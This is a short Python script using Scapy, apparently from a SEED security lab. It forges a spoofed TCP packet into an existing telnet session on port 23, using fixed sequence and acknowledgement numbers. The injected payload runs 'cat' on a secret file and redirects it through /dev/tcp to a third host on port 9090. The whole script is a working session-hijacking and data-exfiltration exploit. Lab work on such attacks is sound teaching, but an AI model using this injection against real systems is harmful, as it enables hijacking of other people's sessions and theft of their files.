from scapy.all import *
ip = IP(src="192.168.15.195", dst="192.168.15.210")
tcp = TCP(sport=44344, dport=23, flags="A", seq=3663590289, ack=91442713)
data = "\ncat /home/seed/secret.txt > /dev/tcp/192.168.15.179/9090\n"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
